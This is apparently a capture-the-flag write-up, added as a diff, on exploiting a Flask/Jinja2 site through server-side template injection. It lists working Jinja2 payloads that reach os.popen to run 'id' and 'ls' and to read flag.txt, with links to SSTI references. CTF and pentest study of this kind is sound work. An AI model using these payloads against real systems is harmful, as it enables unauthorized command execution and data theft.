@@ -1,0 +1,25 @@
+Site still under construction
+Proudly powered by Flask/Jinja2
+
+flask 1.0.1
+python 3.9.0
+php
+
+
+
+1- googling flask/jnja2 exploits
+2- i found Server-Side Template Injection (SSTI)
+3- {{ config.items() }} works so, let's move and try:
+4- {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+5- {{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+6- {{ request.application.__globals__.__builtins__.__import__('os').popen('more flag.txt').read() }}
+
+
+RESOURCES:
+https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
+https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/
+
+
+
+
+
